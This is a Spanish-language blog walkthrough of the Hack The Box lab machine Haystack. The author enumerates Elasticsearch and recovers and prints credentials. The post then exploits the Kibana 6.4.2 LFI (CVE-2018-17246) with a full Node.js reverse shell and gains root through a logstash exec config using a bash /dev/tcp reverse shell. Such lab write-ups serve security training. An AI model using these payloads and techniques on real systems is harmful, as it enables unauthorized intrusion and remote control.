<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Haystack :: sckull — HackTheBox Writeups, CTF</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Nombre Haystack     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.115   Maker JoyDragon      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [6.5, 4.4, 6.1, 3.9, 5.6] }, { label: &#34;"/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/haystack/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://sckull.github.io/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Haystack :: sckull — HackTheBox Writeups, CTF" />
<meta name="twitter:description" content="Nombre Haystack     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.115   Maker JoyDragon      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [6.5, 4.4, 6.1, 3.9, 5.6] }, { label: &#34;" />
<meta name="twitter:site" content="https://sckull.github.io" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/../../image/htb/haystack/cover.png">


<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Haystack :: sckull — HackTheBox Writeups, CTF">
<meta property="og:description" content="Nombre Haystack     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.115   Maker JoyDragon      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [6.5, 4.4, 6.1, 3.9, 5.6] }, { label: &#34;" />
<meta property="og:url" content="https://sckull.github.io/posts/haystack/" />
<meta property="og:site_name" content="Hack The Box - Haystack" />
<meta property="og:image" content="https://sckull.github.io/../../image/htb/haystack/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Haystack",
        "headline" : "Hack The Box - Haystack",
        "description" : "Nombre Haystack     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.115   Maker JoyDragon      new Chart(document.getElementById("radar-chart"), { type: 'radar', data: { labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"], datasets: [ { label: "User", fill: true, backgroundColor: "rgba(179,181,198,0.2)", borderColor: "rgba(179,181,198,1)", pointBorderColor: "#fff", pointBackgroundColor: "rgba(179,181,198,1)", data: [6.5, 4.4, 6.1, 3.9, 5.6] }, { label: "",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2019",
        "datePublished": "2019-11-02 00:00:00 &#43;0000 UTC",
        "dateModified" : "2019-11-02 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/haystack/",
        "wordCount" : "1458",
        "keywords" : [ "hackthebox","masscan","nmap","elasticsearch","kibana 6.4.2","kibana LFI","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2019-11-02 00:00:00 &#43;0000 UTC" />





</head>
<body class="">
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="https://sckull.github.io/about">About</a></li>
        
      
        
          <li><a href="https://sckull.github.io/tags/">Tags</a></li>
        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="https://sckull.github.io/about">About</a></li>
      
    
      
        <li><a href="https://sckull.github.io/tags/">Tags</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    
  <div class="post">
    <h2 class="post-title"><a href="https://sckull.github.io/posts/haystack/">Hack The Box - Haystack</a></h2>
    <div class="post-meta">
      
        <span class="post-date">
            Saturday, Nov 2, 2019
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
    </div>
        
    
      <span class="post-tags">Tags:
        
         #<a href="https://sckull.github.io/tags/hackthebox/">hackthebox</a>&nbsp;
        
         #<a href="https://sckull.github.io/tags/masscan/">masscan</a>&nbsp;
        
         #<a href="https://sckull.github.io/tags/nmap/">nmap</a>&nbsp;
        
         #<a href="https://sckull.github.io/tags/elasticsearch/">elasticsearch</a>&nbsp;
        
         #<a href="https://sckull.github.io/tags/kibana-6.4.2/">kibana 6.4.2</a>&nbsp;
        
         #<a href="https://sckull.github.io/tags/kibana-lfi/">kibana LFI</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/haystack/../../image/htb/haystack/cover.png" class="post-cover" />
      
      <hr />
     
    
    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Nombre</th>
<th>Haystack</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Windows</td>
</tr>

<tr>
<td>Puntos</td>
<td>20</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Facil</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.115</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/32897">JoyDragon</a></td>
</tr>
</tbody>
</table>

<div id="grapher"><canvas id="radar-chart" width="100" height="50"></canvas>
    <script>
    new Chart(document.getElementById("radar-chart"), {
    type: 'radar',
    data: {
      labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"],
      datasets: [
        {
          label: "User",
          fill: true,
          backgroundColor: "rgba(179,181,198,0.2)",
          borderColor: "rgba(179,181,198,1)",
          pointBorderColor: "#fff",
          pointBackgroundColor: "rgba(179,181,198,1)",
          data: [6.5, 4.4, 6.1, 3.9, 5.6]
        }, {
          label: "Maker",
          fill: true,
          backgroundColor: "rgba(255,99,132,0.2)",
          borderColor: "rgba(255,99,132,1)",
          pointBorderColor: "#fff",
          pointBackgroundColor: "rgba(255,99,132,1)",
          pointBorderColor: "#fff",
          data: [0,0,0,0,0]
        }
      ]
    },
    options: {
      title: {
        display: true,
        text: 'Calificacion'
      }
    }
});
    </script>
</div>

<hr />

<hr />

<h2 id="masscan-nmap">MASSCAN &amp; NMAP</h2>

<p>Escaneo de puertos tcp/udp y su servicio.</p>

<pre><code class="language-bash">masscan -p1-65535,U:1-65535 10.10.10.115 --rate=1000 -e tun1

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-30 00:02:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.115                                    
Discovered open port 80/tcp on 10.10.10.115
Discovered open port 9200/tcp on 10.10.10.115

# Nmap 7.70 scan initiated Sat Jun 29 21:50:27 2019 as: nmap -sV -sC -p 9200,22,80 -o nmap.scan -e tun1 10.10.10.115
Nmap scan report for 10.10.10.115
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 29 21:51:09 2019 -- 1 IP address (1 host up) scanned in 42.27 seconds
</code></pre>

<h2 id="gobuster-puerto-80">GOBUSTER - Puerto 80</h2>

<p>Realizamos una busqueda de directorios y archivos en el puerto 80 http con gobuster.</p>

<pre><code class="language-bash">root@sckull:~/htb/haystack# gobuster -u http://10.10.10.115/ -w /usr/share/wordlists/dirb/common.txt -np -x php,txt,html -t 15 -q
/index.html (Status: 200)
/index.html (Status: 200)
</code></pre>

<h4 id="hint-imagen">Hint - Imagen</h4>

<p>Dentro de la imagen que se encuentra en el index del puerto 80 encontramos una cadena en base64 con lo que parece un hint.
Imagen:
<img src="../../image/htb/haystack/Screenshot_20190629_172727.png" alt="image" /></p>

<p>Hint:
<img src="../../image/htb/haystack/Screenshot_20190629_172523.png" alt="image" /></p>

<h2 id="gobuster-puerto-9200">GOBUSTER - Puerto 9200</h2>

<p>Realizamos una busqueda de directorios y archivos en el puerto 9200 con gobuster.</p>

<pre><code class="language-bash">root@sckull:~/htb/haystack# gobuster -u http://10.10.10.115:9200/ -w /usr/share/wordlists/dirb/common.txt -np -x txt,html -t 15

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.115:9200/
[+] Threads      : 15
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,html
[+] Timeout      : 10s
=====================================================
2019/06/29 19:25:40 Starting gobuster
=====================================================
/_stats (Status: 200)
/_template (Status: 200)
/bank (Status: 200)
/favicon.ico (Status: 200)
/quotes (Status: 200)
=====================================================
2019/06/29 19:27:49 Finished
=====================================================
</code></pre>

<p>Encontramos algunos directorios no muy comunes, al visitar este puerto con firefox encontramos que esta corriendo un servidor de Elasticsearch en su version 6.4.2.</p>

<p><img src="../../image/htb/haystack/Screenshot_20190629_172943.png" alt="image" /></p>

<p>Al hacer una pequeña enumeracion encontramos 3 aliases, los cuales podemos utilizar para obtener informacion que esta almacenado en el servidor.</p>

<p><img src="../../image/htb/haystack/Screenshot_20190629_173833.png" alt="image" /></p>

<p>En el alias de <code>.kibana</code> encontramos una vulnerabilidad de LFI pero esta no afecta a este alias del servidor.</p>

<p>Para obtener informacion de uno de los aliases (index) vamos a utilizar el siguiente query:</p>

<p><a href="https://stackoverflow.com/questions/8829468/elasticsearch-query-to-return-all-records
      https://www.elastic.co/guide/en/elasticsearch/reference/current/full-text-queries.html"><strong>Elasticsearch Query</strong></a></p>

<pre><code class="language-bash">curl -s -X GET &quot;http://10.10.10.115:9200/bank/_search&quot; -H 'Content-Type: application/json' -d'
{
  &quot;size&quot;: 5,
  &quot;query&quot;:
   {
    &quot;match_all&quot;: {}
   }
}
'
</code></pre>

<p>El resultado del query son 5 valores que se encuentran dentro de &lsquo;bank&rsquo;, podemos hacer lo mismo para los demas aliases que encontramos.</p>

<p><img src="../../image/htb/haystack/Screenshot_20190629_174752.png" alt="image" /></p>

<p>En este caso vamos a buscar dentro del alias &lsquo;quotes&rsquo;, como anteriormente obtuvimos un &lsquo;hint&rsquo; en la imagen del index vamos a buscar en este caso la palabra &ldquo;clave&rdquo; dentro de este alias.</p>

<pre><code class="language-bash">curl -s -X GET http://10.10.10.115:9200/quotes/_search?q=clave | jq .
</code></pre>

<p>Screenshot_20190629_175810.png</p>

<pre><code class="language-json">&quot;hits&quot;: {
    &quot;total&quot;: 2,
    &quot;max_score&quot;: 5.9335938,
    &quot;hits&quot;: [
      {
        &quot;_index&quot;: &quot;quotes&quot;,
        &quot;_type&quot;: &quot;quote&quot;,
        &quot;_id&quot;: &quot;45&quot;,
        &quot;_score&quot;: 5.9335938,
        &quot;_source&quot;: {
          &quot;quote&quot;: &quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;
        }
      },
      {
        &quot;_index&quot;: &quot;quotes&quot;,
        &quot;_type&quot;: &quot;quote&quot;,
        &quot;_id&quot;: &quot;111&quot;,
        &quot;_score&quot;: 5.3459888,
        &quot;_source&quot;: {
          &quot;quote&quot;: &quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;
        }
      }
    ]
  }
</code></pre>

<p>Obtenemos dos resultados, los cuales nso muestran dos mensajes con una cadena en base64, al decodificarlos obtenemos credenciales.</p>

<p><img src="../../image/htb/haystack/Screenshot_20190629_180158.png" alt="image" /></p>

<pre><code class="language-text">user: security
pass: spanish.is.key
</code></pre>

<h2 id="ssh-user-flag">SSH - User flag</h2>

<p>Ya que obtuvimos nuestras credenciales nos logeamos atravez del servicio ssh, obtenemos una shell y nuestra flag <strong>user.txt</strong>.</p>

<p><img src="../../image/htb/haystack/Screenshot_20190629_180413.png" alt="image" /></p>

<h2 id="kibana-6-4-2">Kibana 6.4.2</h2>

<p>Como vimos anteriormente encontramos un alias .kibana el cual no era afectado en el puerto 9200, al obtener una shell pudimos hacer una enumeracion y encontrar el archivo de configuracion en este caso kibana.yml el cual se encuentra en la carpeta <code>/etc/kibana/</code>.</p>

<p>Vemos que la configuracion de este archivo tiene otro puerto en el cual esta corriendo el &lsquo;backend&rsquo; de la aplicacion, pero este solo esta disponible en la maquina de manera local.</p>

<p><img src="../../image/htb/haystack/Screenshot_20190629_181315.png" alt="image" /></p>

<p>Para poder ver lo que hay en el puerto 5601 vamos a hacer port forwarding, para traerlo localmente a nuestra maquina. Para ello utilizamos el siguiente comando:</p>

<pre><code class="language-bash">ssh -L 5601:localhost:5601 security@10.10.10.115
</code></pre>

<p>Verificamos con netstat que el puerto este activo en nuestra maquina:</p>

<p><img src="../../image/htb/haystack/Screenshot_20190629_181642.png" alt="image" /></p>

<p>Visitamos el puerto de manera local y nos muestra una plataforma, en este caso la de Kibana.</p>

<p><img src="../../image/htb/haystack/Screenshot_20190629_181807.png" alt="image" /></p>

<h3 id="lfi-kibana-6-4-2">LFI - Kibana 6.4.2</h3>

<p>Como lo dije anteriormente la version de Kibana 6.4.2 tiene una vulnerabilidad la cual permite ejecutar codigo mediante archivo javascript u obtener archivos mediante LFI, al explotar esta vulnerabilidad de LFI esta solo se ve reflejada dentro del archivo &lsquo;log&rsquo; de Kibana.</p>

<p><a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/"><strong>Execute This</strong></a></p>

<p><a href="https://github.com/mpgn/CVE-2018-17246"><strong>CVE-2018-17246</strong></a></p>

<p><a href="https://www.youtube.com/watch?v=Tx44iY-Yt7I"><strong>YouTube Kibana</strong></a></p>

<p><a href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell"><strong>Reverse Shell NodeJS</strong></a></p>

<p>Una cosa importante que debemos saber es de que, los archivos que se reflejan dentro del log son archivos a los que Kibana tiene acceso. Para obtener una shell tenemos que escribir un archivo javascript dentro de la maquina en un lugar donde el usuario Kibana tenga acceso, el codigo de la Shell Inversa es:</p>

<pre><code class="language-javascript">(function(){
    var net = require(&quot;net&quot;),
        cp = require(&quot;child_process&quot;),
        sh = cp.spawn(&quot;/bin/sh&quot;, []);
    var client = new net.Socket();
    client.connect(1337, &quot;10.10.14.85&quot;, function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
</code></pre>

<p>Escribimos nuestra shell en <code>/tmp/</code> y le dimos permisos para todos los usuarios:</p>

<p><img src="../../image/htb/haystack/Screenshot_20190629_183422.png" alt="image" /></p>

<p>Para poder ejecutar nuestra shell inversa podemos hacer una solicitud con curl o hacerlo con firefox:</p>

<pre><code class="language-bash">curl &quot;http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../tmp/shell.js&quot; -vv
</code></pre>

<p>Por otro lado obtuvimos nuestra shell inversa como usuario Kibana:</p>

<p><img src="../../image/htb/haystack/Screenshot_20190629_183604.png" alt="image" /></p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Para obtener una shell como usuario root primero enumeramos los crons que se ejecutan con el usuario root esto lo hacemos con pspy. Al realizar esto encontramos un proceso que se ejecuta cada minuto aproximadamente. Este proceso esta relacionado con logstash la cual es una herramienta que administra los logs.</p>

<p><img src="../../image/htb/haystack/Screenshot_20190630_003942.png" alt="image" /></p>

<p>Al realizar una enumearcion de esta herramienta encontramos dentro de <code>/etc/logstash</code> los archivos de configuracion de esta herramienta. Dentro de la carpeta <code>/etc/logstash/conf.d</code> encontramos 3 archivos los cuales se utilizan para administrar logs.</p>

<p>El primer archivo (filter.conf) contiene una expresion regular la cual es utlizada para organizar los archivos log. En el segundo archivo (input.conf) encontramos que apunta a un archivo <code>path =&gt; /opt/kibana/logstash_*</code> el cual va ser ejecutado por el programa con cierto intervalo de tiempo. En el tercer archivo (output.conf) este ultimo ejecuta el archivo o el codigo que se encuentra en el archivo (path) <code>input.conf</code>.</p>

<p><strong>filter.conf</strong>:</p>

<pre><code class="language-markdown">filter {
   if [type] == &quot;execute&quot; {
      grok {
         match =&gt; { &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }
      }
   }
}
</code></pre>

<p><strong>input.conf</strong>:</p>

<pre><code class="language-markdown">input {
   file {
      path =&gt; &quot;/opt/kibana/logstash_*&quot;
      start_position =&gt; &quot;beginning&quot;
      sincedb_path =&gt; &quot;/dev/null&quot;
      stat_interval =&gt; &quot;10 second&quot;
      type =&gt; &quot;execute&quot;
      mode =&gt; &quot;read&quot;
   }
}
</code></pre>

<p><strong>output.conf</strong>:</p>

<pre><code>output {
   if [type] == &quot;execute&quot; {
      stdout { codec =&gt; json }
      exec {
         command =&gt; &quot;%{comando} &amp;&quot;
      }
   }
}
</code></pre>

<p><a href="https://stackoverflow.com/questions/44591928/logstash-configuration-to-execute-a-command-to-elastic-search"><strong>Execute Cmd on Elasticsearch</strong></a></p>

<p>Ya que este programa es ejecutado por el usuario root cada cierto tiempo, podemos escribir como usuario Kibana en el directorio /opt/kibana/ un archivo de shell inversa, pero este archivo debe de hacer match con la expresion regular que se encuentra en el archivo <strong>filter.conf</strong>: <code>('match =&gt; { &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }')</code>.</p>

<p>Para poder entender un poco mas las expresiones regulares de esta herramienta podemos verlo aqui:</p>

<p><a href="https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html#_custom_patterns
      https://streamsets.com/documentation/datacollector/latest/help/datacollector/UserGuide/Apx-GrokPatterns/GrokPatterns_title.html"><strong>Grok Patterns</strong></a></p>

<p>El codigo que debemos de agregar al archivo es:</p>

<pre><code class="language-bash">Ejecutar comando : /usr/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.85/1598 0&gt;&amp;1
</code></pre>

<p>Para agregar el codigo a nuestro archivo utilizamos el siguiente comando:</p>

<pre><code class="language-bash">echo &quot;Ejecutar comando : /usr/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.85/1598 0&gt;&amp;1&quot; &gt; /opt/kibana/logstash_bash
</code></pre>

<p>El nombre de nuestro archivo debe de llevar en su nombre <code>logstash_</code> (input.conf) para que pueda ser ejecutado en nuestro caso <code>/opt/kibana/logstash_bash</code>. Un problema que tiene esta herramienta es la ejecucion, especificamente por el nombre ya que por alguna razon utilizar el mismo nombre de archivo genera algun problema y no se ejecuta, por lo que al agregar o cambiar el comando que se desea ejecutar se debe de crear un nuevo archivo con diferente nombre.</p>

<p><img src="../../image/htb/haystack/Screenshot_20190630_005706.png" alt="image" /></p>

<p>Por otro lado ponemos a la escucha netcat con el puerto que le pasamos a nuestra shell inversa, esperamos un poco a que se ejecute el cron de nuevo y obtenemos una shell como usuario root y nuestra flag <strong>root.txt</strong>.</p>

<p>Codigo de nuestra shelll inversa se ejecuta:</p>

<p><img src="../../image/htb/haystack/Screenshot_20190630_010005.png" alt="image" /></p>

<h4 id="shell-usuario-root">Shell, usuario root:</h4>

<p><img src="../../image/htb/haystack/Screenshot_20190629_232129.png" alt="image" /></p>

    </div>    
    <hr />
    <div >
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>
    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/jarvis/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Jarvis</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/writeup/">
                <span class="button__text">Hack The Box - Writeup</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    </div>
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>


  
</div>

</body>
</html>
